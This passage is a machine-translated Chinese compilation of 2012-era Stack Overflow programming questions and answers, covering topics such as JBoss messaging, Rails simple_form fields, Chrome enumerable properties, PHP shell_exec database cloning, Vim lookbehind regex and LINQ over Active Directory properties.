首先，分配后分配给数据元素会泄漏先前分配的内存。当您分配一个 char * 时，您只分配 char *：它不会复制字符串，它会覆盖指针。

其次，您正在释放堆栈上声明的数据。您可以使用以下方式定义数据：

```
char *data[size_of_daten]; 
```

这描述了一个字符指针的堆栈数组。当您的函数返回时，它将超出范围，手动释放它会爆炸。

# jboss - Jboss消息。每次发送一条消息

> ID：12146455
> 
> 赞同：0
> 
> 时间：2012-08-27T17:16:25.733
> 
> 标签：jboss, messaging

我们使用的是 JBOSS 5.1.0，我们使用主题来存储我们的消息。我们的客户正在进行持久订阅以获取这些消息。

一切正常，但一个问题是我们正在从 TCP 客户端获取数据，我们正在处理并将其保存在主题中，它每秒发送大约 10 条消息，而我们的客户端一次读取一条消息。这之间有一个巨大的差距，一段时间后，JBOSS 主题有很多消息并且它崩溃说内存不足。是否有任何解决方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:22:01.853

基本上，生产者产生的消息比消费者可以处理的多 10 倍。如果这种情况稳定（不仅在高峰期），这将永远不会奏效。

如果你限制生产者每秒只发送一条消息（这当然是可能的，例如 check out [`RateLimiter`](http://docs.guava-libraries.googlecode.com/git/javadoc/com/google/common/util/concurrent/RateLimiter.html)），你将如何处理生产者端的额外消息？如果他们没有在主题中排队，他们将在生产者端排队。

你有几个选择：

*   以某种方式调整您的消费者以更快地处理消息，因此主题永远不会被填满

*   调整主题以使用持久存储。这要好得多。不仅主题不会将所有内容存储在内存中，而且您可能还会获得事务行为（消息是持久的）

*   将要设置为主题的消息队列放入并每秒处理一条消息。该队列必须是持久的，并且必须能够保留比当前主题更多的消息

# javascript - 骨干Facebook API函数

> ID：12146456
> 
> 赞同：1
> 
> 时间：2012-08-27T17:16:38.867
> 
> 标签：javascript, facebook-graph-api, backbone.js

在我的初始化函数中，在我的路由器中，我有这段代码：

```
AppRouter.prototype.initialize = function() {  
     Backbone.history.start();

     FB.api("/me", function(me) {
        name = me.name;
        alert('Hello ' + name)
     });
}; 
```

这提醒我我的名字（你好丹尼）。

但是，我想在 FB.api 函数之外发送此警报：我的新代码 - 它不起作用并返回带有“null”的警报是这样的：

```
AppRouter.prototype.initialize = function() {  
         Backbone.history.start();

         var name;
         name = null;

         FB.api("/me", function(me) {
            name = me.name;
         });
         alert('Hello ' + name)
    }; 
```

任何人都可以建议我如何去做这件事，任何帮助将不胜感激，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T20:33:00.643

好的，在研究了 Backbone 和 Facebook api 如何协同工作之后，我已经完全改变了我的结构。

这两个链接解决了我的问题等等：

[如何在回调函数之外使用 FB.api(JS SDK) 响应？](https://stackoverflow.com/questions/7652558/how-do-i-use-an-fb-apijs-sdk-response-outside-of-the-callback-function)

[https://gist.github.com/2769429](https://gist.github.com/2769429)

# javascript - Javascript扫描线算法查找具有相同x坐标的所有元素

> ID：12146457
> 
> 赞同：8
> 
> 时间：2012-08-27T17:16:39.487
> 
> 标签：javascript, algorithm

我正在尝试通过使用**PURE** Javascript（没有其他框架）来实现线扫描算法，该算法基本上从左到右扫描屏幕并查看共享相同 x 坐标的所有元素（包括重叠元素）。

例如

![我在屏幕上随机有 6 个带有边框布局的 div，我使用一条垂直线（蓝色虚线）从左到右扫描它。](../Images/f9f19711fd63185a20601b78783a9e67.png)

我有 6 个`div`带有黑色边框的元素，它们都在屏幕上随机布局。出于说明目的，我使用一条垂直的蓝色虚线从左到右扫描整个平面。目标是报告该行通过的所有元素。对于上面的示例，我们如何使用 JavaScript 报告,和`Div A`inside `Div E`？`Div D``hyperlink D``Div D`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:52:27.870

[`getBoundingClientRect`您可以使用方法](https://developer.mozilla.org/en-US/docs/DOM/element.getBoundingClientRect)获取元素的位置。然后遍历它们并检查它们是否与您的扫描匹配：

```
var all = document.body.getElementsByTagName("*");
var x = /* blue line */;
var match = [];
for (var i=0; i<all.length; i++) {
    var rect = all[i].getBoundingClientRect();
    if (rect.left < x && rect.right > x)
        match.push(all[i]);
}); 
```

更短、更实用的方式：

```
var match = Array.prototype.filter.call(document.body.querySelectorAll("*"), function(el) {
    var rect = el.getBoundingClientRect();
    return rect.left < x && rect.right > x;
}); 
```

如果您需要一个经常使用的快速访问功能，您可以将所有元素（及其坐标）存储在一个排序的数据结构中，一个[段树](http://en.wikipedia.org/wiki/Segment_tree)，您可以在其中搜索它们。

此外，当保证 DOM 元素的子节点不超出其父节点边界时，您可以轻松地将 DOM 本身用作搜索树：

```
var x = /* the blue line */;
var match = function find(el, set) {
    var rect = el.getBoundingClientRect();
    if (rect.left < x && rect.right > x) {
        set.push(el);
        for (var i=0; i<el.children.length; i++)
            find(el.children[i]);
    }
    return set;
}(document.body, []); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:43:30.173

1.  收集所有 DOM 元素
2.  [找到它们的位置](https://stackoverflow.com/questions/7630338/using-javascript-to-find-position-of-dom-elements)并将它们存储在一个数组中（这样您就可以再次使用数据而无需通过 DOM）
3.  循环遍历数组并求解 x

# ruby-on-rails - rails simple_form 字段与模型无关

> ID：12146466
> 
> 赞同：74
> 
> 时间：2012-08-27T17:17:32.817
> 
> 标签：ruby-on-rails, simple-form

我有一个与名为“订单”的模型相关联的现有表单，但我想添加新的表单字段，这些字段将捕获信用卡信息，例如姓名、抄送号码等，以便在第 3 方支付网关上进行处理。

但是由于我不想在我们的数据库中保存 CC 信息，所以我的订单表中没有相应的列。这在提交这些信用卡输入字段不是订单模型的“一部分”的表单时给了我一个错误。

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2013-02-02T06:21:00.163

如果我正确理解您的答案，您想要做的将在此处的官方 wiki 页面中进行说明：[创建不读取属性的虚假输入](https://github.com/plataformatec/simple_form/wiki/Create-a-fake-input-that-does-NOT-read-attributes)。根据 Edward 的建议，您可以使用与任何真实数据库列无关的字段，但是如果表单字段与模型无关，则无需在模型中定义属性。

总之，页面中解释的技巧是定义一个名为“FakeInput”的自定义输入，并像这样使用它：

```
<%= simple_form_for @user do |f| %>
  <%= f.input :agreement, as: :fake %>
  .... 
```

正如 Fitter Man 评论的那样，在添加/修改自定义输入后不要忘记重新启动您的 Rails 服务器。

**更新：**请注意[官方 wiki 页面已更新](https://github.com/plataformatec/simple_form/wiki/Create-a-fake-input-that-does-NOT-read-attributes/_history)，wiki 页面上的示例代码不适用于使用旧版本 SimpleForm 的用户。如果您遇到类似的错误，请改用下面的代码`undefined method merge_wrapper_options for...`。我正在使用 3.0.1，这段代码运行良好。

```
class FakeInput < SimpleForm::Inputs::StringInput
  # This method only create a basic input without reading any value from object
  def input
    template.text_field_tag(attribute_name, input_options.delete(:value), input_html_options)
  end
end 
```

* * *

## 回答 #2

> 赞同：44
> 
> 时间：2012-08-27T17:27:52.967

您可以使用 attr_accessor

```
 class Order < ActiveRecord::Base

   attr_accessor :card_number

 end 
```

现在您可以`Order.first.card_number = '54421542122'`在您的表单或您需要做的任何其他事情中执行或使用它。

请参阅此处查看 ruby​​ 文档[http://www.ruby-doc.org/core-1.9.3/Module.html#method-i-attr_accessor](http://www.ruby-doc.org/core-1.9.3/Module.html#method-i-attr_accessor) 和此处查看有用的 stackoverflow 问题[What is attr_accessor in Ruby？](https://stackoverflow.com/questions/4370960/what-is-attr-accessor-in-ruby)

不要将它与 attr_accessible 混淆！ [attr_accessor 和 attr_accessible 的区别](https://stackoverflow.com/questions/3136420/difference-between-attr-accessor-and-attr-accessible)

* * *

## 回答 #3

> 赞同：42
> 
> 时间：2015-10-21T04:42:27.517

处理此问题的最佳方法是`simple_fields_for`像这样使用：

```
<%= simple_form_for @user do |f| %>
  <%= f.input :first_name %>
  <%= f.input :last_name %>
  <%= f.input :email %>

  <%= simple_fields_for :other do |o| %>
    <%= o.input :change_password, as: :boolean, label: 'I want to change my password' %>
  <% end %>
<% end %> 
```

在此示例中，我添加了一个名为的新字段`change_password`，它不是基础`user`模型的一部分。

这是一个好方法的原因是它允许您使用任何简单的表单输入/包装器作为字段。我不关心@baxang 的答案，因为它不允许您使用不同类型的输入。这似乎更灵活。

请注意，要使其正常工作，我必须传递`:other`给`simple_fields_for`. **只要没有同名的模型，**您就可以传递任何字符串/符号。

即不幸的是我不能通过`:user`，因为 simple_form 会尝试实例化用户模型，并且我们会再次收到相同的错误消息......

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2013-04-17T05:54:32.907

此外，如果您只是想添加一些东西并将其放入 中`params`，但将其排除在模型的散列之外，您可以只使用 FormTagHelpers。 [http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html](http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html)

例子：

```
 <%= simple_form_for resource, :as => resource_name, :url =>   invitation_path(resource_name), :html => {:method => :post} do |f| %>
       <%= devise_error_messages! %>

    <% resource.class.invite_key_fields.each do |field| -%>
       <%= f.input field %>
       <%= hidden_field_tag :object_name, @object.class.name %>
       <%= hidden_field_tag :object_id, @object.id %>
    <% end -%> 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2018-09-27T18:48:49.717

我发现了一个非常简单（而且有些奇怪）的解决方法。

只需在里面添加`input_html`带有任何`value`键的选项。例如：

```
= simple_form_for @user do |f|
  = f.input :whatever, input_html: {value: ''} 
```

测试 simple_from 版本：3.2.1、3.5.1

# javascript - 不可枚举的属性出现在 Chrome 的 for...in 循环中

> ID：12146473
> 
> 赞同：13
> 
> 时间：2012-08-27T17:18:10.930
> 
> 标签：javascript, google-chrome

A `for`-`in`循环将遍历对象的所有可枚举属性，即使是原型链中的属性。该函数`hasOwnProperty`可以过滤掉原型链中的那些可枚举属性。最后，该函数`propertyIsEnumerable`可以区分对象的可枚举属性。

因此，以下脚本**不应打印任何内容**：

```
for(a in window)
    if(window.hasOwnProperty(a) && !window.propertyIsEnumerable(a))
        console.log(a); 
```

然而，在 Chrome 上，上面打印*了很多*属性名称。

为什么`for`-`in`循环并`propertyIsEnumerable`在可枚举方面相互矛盾？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-15T06:08:22.883

可悲的事实是 JavaScript 引擎并不相同。虽然符合 ES5 的引擎会尽职尽责地尊重其属性的可枚举性，`window`但正如上面 pimvdb 和 Felix 所指出的，它是一个宿主对象，并且不受 ES5 规则的约束。

您可以看到更多关于`window`对象实际存在的证据`window.constructor`，这将表明它是由

```
function Window() { [native code] } 
```

因此，我们无法确定为什么某些属性是可枚举的（根据 Chrome），而其他属性不是来自 JavaScript 运行时。

但是，您仍然可以`window`通过查看[其 MDN 文章](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/keys)“返回在给定对象上找到的所有自己的可枚举属性的数组”`Object.keys(window)`来查看 Chrome 不一致的可枚举属性的完整状态。

这样做仍然会返回一个包含 30 多个属性的数组。把它归结为 Chrome 的陌生感！

编辑：通过一些进一步的测试，我找到了让 Chrome 理解`window`'s enumerable properties的正确方法

```
Object.keys(window).filter(function(prop) {
  return window.hasOwnProperty(prop) && !window.propertyIsEnumerable(prop);
}); 
```

在 Chrome 中，用于枚举的候选属性列表似乎`for...in`不是由返回的`Object.keys`，但实际上更接近于`Object.getOwnPropertyNames`哪个列表可枚举和不可枚举的属性。然而，即使这样也不一致。在我的测试中，和分别`window.hasOwnProperty(prop) && !window.propertyIsEnumerable(prop)`为 423 和 454的属性列表。`for...in``Object.getOwnPropertyNames`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:27:48.430

铬很奇怪：

```
for(a in window)
    if(window.hasOwnProperty(a) && window.propertyIsEnumerable(a))
        console.log(a); 
```

与 chrome 中的 450 个属性相比，它提供了大约 30 个属性。

# css - 奇怪的 Wordpress/CSS 问题

> ID：12146478
> 
> 赞同：0
> 
> 时间：2012-08-27T17:18:31.517
> 
> 标签：css, wordpress, wordpress-theming

我的页面在 Chrome 中显示良好，但在 Safari 和 Firefox 中，顶部被切断，我终生无法弄清楚原因。也许有人可以看看并提供一些建议？

页面在这里->

[http://blog.praxispr.ca](http://blog.praxispr.ca)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:22:24.067

它也无法在 Chrome 中正确显示。

切线：`top: -28px`在`body`样式表中的选择器下方。我不确定它为什么会在那里。

# c# - 每次打开 Excel 时，VSTO 加载项都会打开默认工作簿

> ID：12146481
> 
> 赞同：0
> 
> 时间：2012-08-27T17:18:47.037
> 
> 标签：c#, excel, vsto

我开发了一个 Excel 插件并将其安装在我的机器上。当我在桌面 ( `sample.xlsx`) 上打开 Excel 时，它总是与默认工作簿一起打开`Book1.xlsx`。当我验证插件菜单时，我看到插件在`Excel -> Addins`菜单中出现了两次。

我们可以设置一个条件，如果具有相似名称的插件已经加载，那么它将不会再次加载？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T19:39:40.647

如果您有多个条目删除不需要的条目，请检查 HKEY_CURRENT_USER\Software\Microsoft\Office\Excel\Addins 下的注册表条目。

还要检查 HKEY_LOCAL_MACHINE 下的相同内容

# php - 将变量数据从 PHP 传递到 shell_exec 命令

> ID：12146482
> 
> 赞同：0
> 
> 时间：2012-08-27T17:18:47.083
> 
> 标签：php, command-line, mysqli, variable-assignment, shell-exec

我有一个脚本，可以将表从主 sql 转储文件克隆到唯一命名的 MySQL 数据库。每个帐户都有自己的数据库，但所有帐户的表结构都相同。我的解决方案是转储主数据库表，然后通过 PHP shell_exec，运行 MySQL 控制器 cmd (mysql) 以使用默认表填充新创建的数据库。

问题：该过程有效，但仅当我在主 sql 转储文件中硬编码帐户唯一数据库名称时。

但是，主 sql 文件中的“USE acct_dbID”行需要在运行时动态设置。

这是代码：

```
include('.dbase_credentials'); //constants for connection object

//using PHP built in connection class mysqli
$mysqli = new mysqli(DB_HOST,DB_UNAME,DB_UPWORD,DB_NAME);
if ($mysqli->connect_errno){
    echo "Failed to open database connection: ".$mysqli->connect_error;
    exit();
}

$dbID=$varNum; //variable, number ID generated earlier in the account setup process

//create database, doesnt return a resultset, no need for object var here
if ($mysqli->query("CREATE DATABASE acct_".$dbID) === TRUE){

    //if dbase was created, clone the tables
    $res = shell_exec('mysql -u dbaseUser --password=`cat /path/to/pass` -e "source /path/to/master_tables.sql" acct_'.$dbID);

    //provide some UI feedback, shell_exec returns null on failure
    if ($res!=null){
        echo "The tables were cloned!";
    }else{
        echo "The cloning process failed!";
    }
}else{
    echo "no database created.";
} 
```

同样，master_tables.sql 需要在运行时传递它的可变数据，因此“USE acct_dbID”可以特定于每个新帐户。

任何想法表示赞赏。rwhite35

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T18:38:42.310

knittl 对我需要做的事情有正确的方向。请参阅上面的评论对话。谢谢针织。这是使用 multi_query 和 file_get_contents 的新代码块。

```
if ($mysqli->query("CREATE DATABASE acct_".$dbID) === TRUE){
$acct="acct_".$dbID;
$query = "USE ".$acct.";";
$query .= file_get_contents('/path/to/master_table.sql');
$result=$mysqli->multi_query($query);           
} 
```

现在 account 可以是变量，multi_query 将运行字符串中的每个查询语句。我可能会失去一些效率，但获得了为每个新帐户克隆表的能力。唯一的附加编辑是对 master_table.sql。我删除了转储过程添加的所有注释。谢谢，rwhite35

# ios - iOS NSUserDefaults 检查浮动键是否存在

> ID：12146483
> 
> 赞同：2
> 
> 时间：2012-08-27T17:18:50.990
> 
> 标签：ios, nsuserdefaults

我想检查存储的浮点数`NSUserDefaults`是否预先存在。**Apple 文档**建议，如果密钥不存在，它`floatForKey`会这样做。`return 0`

如何正确区分存储的 0 和不存在的密钥？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-27T17:34:02.773

查看是否已设置默认值的可靠方法是：

```
if (![[NSUserDefaults standardUserDefaults] valueForKey:@"foo"]) { ... } 
```

无论数据类型如何，这都有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:33:49.493

如果 objectForKey 为 nil，则不存在对象，因此 NSUserDefaults 中没有存储项目。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:36:50.997

感谢 woz 和 Bernd Rabe。我的解决方案是这样的：

```
 //Set volume
    id savedVolume = [[NSUserDefaults standardUserDefaults] objectForKey:@"GameVolume"];
    if (savedVolume == nil) //Check if volume not already saved (e.g. new install)
    {
        //Set default volume to 1.0
        float defaultVolume = 1.0;
        [[ApplicationController controller].soundManager setGlobalVolume: defaultVolume];
        [[NSUserDefaults standardUserDefaults] setFloat:defaultVolume forKey:@"GameVolume"];
    } else {
        float savedVolume = [[NSUserDefaults standardUserDefaults] floatForKey:@"GameVolume"];
        [[ApplicationController controller].soundManager setGlobalVolume: savedVolume];
    } 
```

这看起来够安全吗？

# xml - 如何使 XML DOCTYPE 有单引号而不是双引号

> ID：12146484
> 
> 赞同：0
> 
> 时间：2012-08-27T17:18:51.280
> 
> 标签：xml, xslt

我正在使用 .xsl 文件将 FileMaker Pro 导出的 XML 文件转换为另一个格式化为 PBCore 2.0 架构的 XML 文件。作为工作流程的一部分，我的组织需要能够在 chrome 中打开输出 XML 文件。一切似乎都工作正常，除了输出文件的标题读取的问题

```
<?xml version="1.0" encoding="UTF-8"?> 
```

代替

```
<?xml version='1.0' encoding='UTF-8'?> 
```

似乎带有双引号的第一个不会在 chrome 中打开，而第二个将在 chrome 中打开。xsl 文档中是否有任何地方可以指定此行使用单引号而不是双引号？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:24:33.910

第一个肯定会在 chrome 中打开，你有一个不同的问题。

现在，您可以使用`<xsl:output omit-xml-declaration="yes" />`将其完全排除在外（该声明达到默认值，因此它的缺席并不重要）。

您甚至可以这样做，然后使用一些讨厌的未转义输出与单引号一起写入。

但是，表单`"`肯定会在 chrome 中打开，所以你解决了错误的问题。

# .net - 实体框架：反映表重命名操作

> ID：12146485
> 
> 赞同：1
> 
> 时间：2012-08-27T17:19:01.500
> 
> 标签：.net, sql-server, entity-framework, edmx, table-rename

是否可以通过简单地使用 XML 编辑器来反映 .edmx 文件中的数据库表名称更改？我希望在 EntitySet 节点中进行此更改就足够了，但似乎不是。

收到“错误 0040：<> 类型未在命名空间 <> 中定义”消息。

这纯粹是数据库表名更改，没有对表进行结构更改，我们正在使用带有 EF 的 POCO 对象。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:22:29.333

是的，这是可能的，但非常非常混乱。

您需要更改[SSDL](http://msdn.microsoft.com/en-us/library/bb399559%28v=vs.100%29.aspx)以及[CSDL](http://msdn.microsoft.com/en-us/library/bb399292%28v=vs.100%29)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-28T10:11:48.657

看来我们可以通过 XML Editor 做到这一点；假设我们只是在重命名表而不改变表本身的结构。

在我们的例子中，这是有道理的，因为原始数据库没有对表进行复数，所以在大多数情况下我们只需要添加一个“s”或一个“es”；因此我们不必对概念模型进行任何更改。

在 --> 下将 Table 属性更改为您的新表名。

参考：[在 EF4 中更改数据库表名（实体框架 4）](https://stackoverflow.com/questions/3276955/change-db-table-name-in-ef4-entity-framework-4)

# php - 如何在 PHP 中将类型转换为类变量

> ID：12146486
> 
> 赞同：0
> 
> 时间：2012-08-27T17:19:03.393
> 
> 标签：php, class, variables

我知道您不必为 PHP 变量指定类型，但可以这样做吗？无需初始化，只需键入强制转换。

```
class A {
    ....
}

class B {

  public var foo= A;

} 
```

谢谢你 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:23:46.937

你可以这样做（字符串）$a; 它强制代码接收这种类型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:22:33.200

您在寻找 settype() PHP 函数吗？

# javascript - 从 iframe 中的 html 中提取变量

> ID：12146487
> 
> 赞同：0
> 
> 时间：2012-08-27T17:19:04.267
> 
> 标签：javascript, jquery, html, iframe

我正在尝试从 iframe 中的另一个 div 中的 iframe 中提取一个 html 变量。

这是我正在使用的代码的摘录：

```
var myVariable = $('#iframe-id').contents().find('.variable-inside').html(); 
```

iframe 已被赋予一个 id (#iframe-id)，变量位于“variable-inside”内，该变量在 iframe 内呈现。

出于某种原因，这对我不起作用。代码有问题吗？

我知道如果两个文档都在同一个域（iframe doc 和其他文档）上，可以使用这种方法，但如果它在同一个域上，我仍然可以使用它，只是不同的子域正确吗？例如：iframe 文档位于 lorem.example.com，其他文档位于 ipsum.example.com）

任何帮助都会很棒。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:21:40.257

不允许跨子域通信（Cross-Domain-Policy），我已经阅读了绕过它的方法，但没有测试过这些。

这是一种方法：[http ://www.tomhoppe.com/index.php/2008/03/cross-sub-domain-javascript-ajax-iframe-etc/](http://www.tomhoppe.com/index.php/2008/03/cross-sub-domain-javascript-ajax-iframe-etc/)

这个想法是`document.domain = "yourdomain.com"`在父页面和子页面上设置（未经测试）。

# c# - 绑定到数据表时的 GridView 编辑

> ID：12146488
> 
> 赞同：1
> 
> 时间：2012-08-27T17:19:13.027
> 
> 标签：c#, asp.net, gridview

我正在创建一个网站，我们的客户可以直接从我们这里订购零件。我有一个数据表设置，当用户单击一个按钮时，它会将订单的快速详细信息添加到网格视图中。在 gridview 中，我启用了编辑和删除按钮。删除功能工作正常，但是当您尝试编辑信息时，它不会使用新信息更改网格视图。这是我到目前为止所拥有的：

```
protected void griditems_RowUpdating(object sender, GridViewUpdateEventArgs e)
{
  DataTable dt = (DataTable)Session["table"];
  foreach (DataRow dr in dt.Rows)
    {
        part = Convert.ToString(dr["Part"]);
        dr["Part"] = part;
        dr["Quantity"] = qty;
        dr["Ship-To"] = shipto;
    }

    griditems.EditIndex = -1;
    BindData();
} 
```

尝试此操作时，它会显示带有原始输入值的 gridview。我也试过这个（不工作，并得到一个错误，说“位置0没有行”：

```
DataTable dt = (DataTable)Session["table"];
GridViewRow row = griditems.Rows[e.RowIndex];
dt.Rows[row.DataItemIndex]["Part"] = ((TextBox)(row.Cells[1].Controls[0])).Text;
dt.Rows[row.DataItemIndex]["Quantity"] = ((TextBox)(row.Cells[2].Controls[0])).Text;
dt.Rows[row.DataItemIndex]["Ship-To"] = ((CheckBox)(row.Cells[3].Controls[0])).Checked;

griditems.EditIndex = -1;
BindData(); 
```

我是否`EditItemTemplate`在 aspx 文件中遗漏了一个，或者我只是`RowUpdating`做错了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:41:19.283

您可能需要退后一步，首先查看如何使用网格视图进行创建、更新、删除和读取。另外，您可能想查看[这篇文章](http://www.dotnetspider.com/resources/20462-Bind-Gridview-from-Session-Then-Edit-Update.aspx)。

# regex - Vim 语法区域 - 后向混淆

> ID：12146491
> 
> 赞同：4
> 
> 时间：2012-08-27T17:19:39.967
> 
> 标签：regex, vim, syntax, match, lookbehind

在 .vimrc 中定义以下内容或在 vim 命令行中执行：

```
syn match ndbMethods "[^. \t\n\r]\@<=[_a-z][_a-zA-Z0-9]*(\@="
hi ndbMethods guibg=#222222 
```

在活动缓冲区中使用 C 风格的方法调用查看结果：

```
foo(); 
```

你会看到方法名的首字母不匹配。

其目的是让后向模式强制将行首、文字`.`或空格放在任何匹配方法的第一个字符之前。

奇怪的是，将其设为负前瞻 ( `\@<!`) 似乎可行！

有人会好心解释为什么这种向后看是不正确的吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-27T17:27:02.080

**更新：**在`f`，向后看，您可能想要检查`[. \t\n\r]`，而不是`[^. \t\n\r]`。因为目前，您说的是“*不*符合这些字符之一的东西”，所以只有达到条件才`o`满足条件，因为`f`确实不是这些字符之一。因此，您必须取消否定字符类，或者如您所见，否定后视。

我想你也把你的术语弄糊涂了。

```
\@<=    positive lookbehind
\@<!    negative lookbehind
\@=     positive lookahead
\@!     negative lookahead 
```

# yii - 小部件的 CListView afterAjaxUpdate 事件

> ID：12146494
> 
> 赞同：0
> 
> 时间：2012-08-27T17:19:47.323
> 
> 标签：yii, yii-events

小部件可以或不在控制器视图上，并且一些小部件会影响 listView。

我在 CListView 中的 afterAjaxUpdate JS 事件上停滞不前。小部件 - 是一个产品过滤器，用于更新列表视图。我的问题是当我想在更新列表视图后更新我的过滤器时。当然我可以在列表视图中配置更新代码，但我认为是错误的，因为这种行为属于过滤器小部件。

我在小部件中试过这个

```
$("#' . $this->listViewId . '").yiiListView.settings.afterAjaxUpdate = function(id, data) {
    console.log(id, data);
}; 
```

但是 ListView js 在下面，显然这是一个糟糕的解决方案。

我在考虑一些公共小部件事件，所以我可以通过过滤器小部件寻址到 listview 小部件并将事件放在那里。

也许有人遇到过相关问题或有更好的想法？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-29T05:27:02.253

尝试这种方式为您的 CListView 添加 afterAjaxUpdate 方法。

```
<?php 
Yii::app()->clientScript->registerScript('handle_ajax_function', "
function addLoadingClass(id,result)
{
    $('.list-view-loading').show();
    $('li.previous').addClass('disable');
    $('li.next').addClass('disable');   
}
function removeLoadingClass(id,result)
{   
    $('li.previous').removeClass('disable');
    $('li.next').removeClass('disable');    
    try{
        $('.list-view-loading').hide(); 
    }catch(e){
        alert(e);
    }
}
");
?>

<?php
$this->widget('zii.widgets.CListView', array(
            'id'=>'handle',
            //'ajaxUpdate'=>false,
            'dataProvider'=>$data,
            'beforeAjaxUpdate'=>'addLoadingClass',
            'afterAjaxUpdate'=>'removeLoadingClass',
            'itemView'=>'myview',           
    )); 
?> 
```

# linq - 将 linq 与 PropertyValueCollection 一起使用

> ID：12146495
> 
> 赞同：2
> 
> 时间：2012-08-27T17:19:48.977
> 
> 标签：linq

我想知道是否有使用 Linq 的方法或更有效的方法。除了使用 while 循环，是否可以选择使用**Linq 查询**的位置？

```
 public UserPrincipal GetUser(string sUserName, string spwd, string domain, string ou)
    {
        PrincipalContext oPrincipalContext = new PrincipalContext(ContextType.Domain, domain, ou, sUserName, spwd);

        UserPrincipal oUserPrincipal = UserPrincipal.FindByIdentity(oPrincipalContext, sUserName);

        DirectoryEntry user = (DirectoryEntry)oUserPrincipal.GetUnderlyingObject();
        PropertyCollection pc = user.Properties;
        IDictionaryEnumerator ide = pc.GetEnumerator();

        ide.Reset();

        while (ide.MoveNext())
        {
            PropertyValueCollection pvc = ide.Entry.Value as PropertyValueCollection;
            if (ide.Entry.Key.ToString() == "XYZ")
            {
                //Response.Write(string.Format("name: {0}", ide.Entry.Key.ToString()));
                //Response.Write(string.Format("Value: {0}", pvc.Value));

            }

        }
    .......;
    .......;

    } 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T23:55:10.383

您不能`Where()`在 a上使用的原因`PropertyCollection`是因为它实现了 non-generic `IEnumerable`， when`Where()`是只有泛型版本的方法。您可以使用将 a 转换`PropertyCollection`为泛型。`IEnumerable`[`Cast<T>()`](http://msdn.microsoft.com/en-us/library/bb341406.aspx)

```
var matches = pc.Cast<DictionaryEntry>().Where(p => p.Key.ToString() == "XYZ");

foreach( var match in matches )
{
    Response.Write(string.Format("name: {0}", match.Key));
    Response.Write(string.Format("Value: {0}", match.Value));
} 
```

这种方式无疑更有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T23:51:23.893

尝试这个：

```
 foreach (PropertyValueCollection pvc in pc.OfType<PropertyValueCollection>().Where(v => v.PropertyName == "XYZ"))
        {
            Response.Write(string.Format("name: {0}", pvc.PropertyName));
            Response.Write(string.Format("Value: {0}", pvc.Value));
        } 
```

此外，您可以尝试使用`ForEach`：

```
 pc.OfType<PropertyValueCollection>()
          .Where(v => v.PropertyName == "XYZ")
          .ToList()
          .ForEach(pvc =>
          {
              Response.Write(string.Format("name: {0}", pvc.PropertyName));
              Response.Write(string.Format("Value: {0}", pvc.Value));
          }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-10-21T04:53:32.953

这是一个非常古老的线程，但我正在寻找一种使用 LINQ 处理 PropertyCollection 的方法。我尝试了建议的方法，但在转换到 DictionaryEntry 时总是得到一个无效的转换异常。有了 DictionaryEntry，像 FirstOrDefault 这样的东西就很时髦。所以，我只是这样做：

```
var directoryEntry = adUser.GetUnderlyingObject() as DirectoryEntry;
directoryEntry.RefreshCache();
var propNames = directoryEntry.Properties.PropertyNames.Cast<string>();
var props = propNames
    .Select(x => new { Key = x, Value = directoryEntry.Properties[x].Value.ToString() })
    .ToList(); 
```

有了这些，我就可以轻松地直接通过 Key 查询任何属性。使用合并和安全导航运算符允许默认为空字符串或其他任何内容。

```
var myProp = props.FirstOrDefault(x => x.Key == "someKey"))?.Value ?? string.Empty; 
```

请注意，“adUser”对象是 UserPrincipal 对象。

# php - 如何将变量的值传递给 PHP 中的数组并将其保存到 CSV 文件？

> ID：12146498
> 
> 赞同：0
> 
> 时间：2012-08-27T17:19:53.870
> 
> 标签：php, forms, csv, fputcsv

我正在尝试从 HTML 文件中的表单生成一个包含名称和电子邮件地址的 CSV 文件，并使用 PHP fputcsv 函数。但我无法将变量的值传递给数组，它返回错误消息。

我的 PHP 文件：

```
<?php 
$name = $_GET["name"];
$email = $_GET["email"];

$list = array
(
'$name', '$email',
);

$file = fopen("list.csv","w");

foreach ($list as $line)
  {
  fputcsv($file,split(',',$line));
  }

fclose($file);
?> 
```

错误信息：

```
Deprecated: Function split() is deprecated in F:\xampp\htdocs\test.php on line 22

Deprecated: Function split() is deprecated in F:\xampp\htdocs\test.php on line 22 
```

我的第 22 行包含：

```
fputcsv($file,split(',',$line)); 
```

如果我只在数组中使用纯文本，我不会收到上述错误。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:25:29.907

单引号不会用字符串中的值替换您的变量。

